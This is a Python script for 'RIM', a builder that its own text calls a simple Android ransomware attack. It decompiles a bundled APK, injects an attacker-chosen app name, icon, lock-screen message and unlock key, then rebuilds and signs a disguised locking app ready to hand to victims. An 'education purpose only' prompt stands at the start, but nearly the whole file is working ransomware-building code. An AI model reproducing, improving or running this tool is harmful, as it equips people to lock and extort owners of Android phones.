#! /usr/bin/env python3
import os, sys, time, fileinput
from getpass import getpass
from PIL import Image

r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[0m"

app_icon = ""
app_name = ""
alert_title = ""
alert_desc = ""
key_pass = ""

def banner():
    print("""
,ggggggggggg,         ,a8a,  ,ggg, ,ggg,_,ggg,  
dP;;;88;;;;;;Y8,      ,8; ;8,dP;;Y8dP;;Y88P;;Y8b 
Yb,  88      `8b      d8   8bYb, `88'  `88'  `88 
`;  88      ,8P      88   88 `;  88    88    88 
    88aaaad8P;       88   88     88    88    88 
    88;;;;Yb,        Y8   8P     88    88    88 
    88     ;8b       `8, ,8'     88    88    88 
    88      `8i 8888  ;8,8;      88    88    88 
    88       Yb,`8b,  ,d8b,      88    88    Y8,
    88        Y8  ;Y88P; ;Y8     88    88    `Y8
                                                
""")

def writefile(file,old,new):
    while True:
        if os.path.isfile(file):
            replaces = {old:new}
            for line in fileinput.input(file, inplace=True):
                for search in replaces:
                    replaced = replaces[search]
                    line = line.replace(search,replaced)
                print(line, end="")
            break
        else: exit(r+"[!]"+w+" Failed to write in file "+file)

def start():
    global app_icon, app_name, alert_title, alert_desc, key_pass
    os.system("clear")
    banner()
    print(r+"[!]"+w+" Use this tool for education purpose only")
    ask = str(input(r+"[!]"+w+" Do you agree (y/n): ").lower())
    if ask in ("yes"): pass
    else: exit(r+"[!]"+w+" Dont be evil !")
    print(f"""
    {r}RIM{w} is a Simple Android Ransomware Attack
    {w}The user can customize the App Icon, Name, Key and others.
    {d}If you forgot the unlock key, just restart your phone !{w}
    """)
    print(b+"> "+w+os.popen("curl ifconfig.co/city --silent").readline().strip()+", "+os.popen("curl ifconfig.co/country --silent").readline().rstrip()+time.strftime(", %d/%m/%Y (%H.%M.%S)"))
    print(b+">"+w+" Use \\n for newline and CTRL + C for exit")
    print(w+"-"*43)
    while True:
        x = str(input(w+"* SET app_icon (PNG only): "+g))
        if os.path.isfile(x):
            if ".png" in x:
                app_icon = x
                break
            else: print(r+"[!]"+w+" File not accepted, PNG format only !")
        else: print(r+"[!]"+w+" File not found, please fill correctly !")
    while True:
        x = str(input(w+"* SET app_name: "+g))
        if len(x) != 0:
            app_name = x
            break
        else: continue
    while True:
        x = str(input(w+"* SET title: "+g))
        if len(x) != 0:
            alert_title = x
            break
        else: continue
    while True:
        x = str(input(w+"* SET description: "+g))
        if len(x) != 0:
            alert_desc = x
            break
        else: continue
    while True:
        x = str(input(w+"* SET unlock key: "+g))
        if len(x) != 0:
            key_pass = x
            break
        else: continue
    print(w+"* Building your ransomware APK's ...")
    print(w+"-"*43+d)
    os.system("apktool d rim.apk")
    imgpath = [
        "rim/res/drawable-mdpi-v4/ic_launcher.png",
        "rim/res/drawable-xhdpi-v4/ic_launcher.png",
        "rim/res/drawable-hdpi-v4/ic_launcher.png",
        "rim/res/drawable-xxhdpi-v4/ic_launcher.png",
    ]
    strings = "rim/res/values/strings.xml"
    print("I: Using strings "+strings)
    smali = os.popen(f"find -O3 -L rim/ -name '*0000.smali'","r").readline().strip()
    print("I: Using smali "+os.path.basename(smali))
    writefile(strings,"appname",app_name)
    print("I: Adding name with "+app_name)
    writefile(strings,"alert_title",alert_title)
    print("I: Adding title with "+alert_title)
    writefile(strings,"alert_desc",alert_desc)
    print("I: Adding description with "+str(len(alert_desc))+" words")
    writefile(smali,"key_pass",key_pass)
    print("I: Adding unlock key with "+key_pass)
    time.sleep(3)
    for path in imgpath:
        if os.path.isfile(path):
            with Image.open(path) as target:
                width, height = target.size
                size = str(width)+"x"+str(height)
                logo = os.path.basename(app_icon)
                os.system("cp -R "+app_icon+" "+logo)
                os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                os.system("rm -rf "+logo)
                print("I: Adding icon with "+os.path.basename(app_icon)+" size: "+size)
        else: exit(1)
    os.system("apktool b rim -o final.apk;rm -rf rim")
    os.system("java -jar signer.jar -a final.apk --ks debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
    os.system("java -jar signer.jar -a final.apk --onlyVerify > /dev/null 2>&1")
    os.system("rm -rf final.apk")
    if os.path.isfile("final-aligned-signed.apk"):
        out = app_name.replace(" ","").lower() + ".apk"
        os.system("mv final-aligned-signed.apk "+out)
        getpass(b+">"+w+" Result saved as: "+B+" "+out+" "+w)
    else: print(r+"[!]"+w+" Failed to signed APK's")

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        exit(r+"\n[!]"+w+" Thanks for Using this tools\n    follow us \033[4mhttps://github.com/termuxhackers-id\033[0m\n    exiting ...")
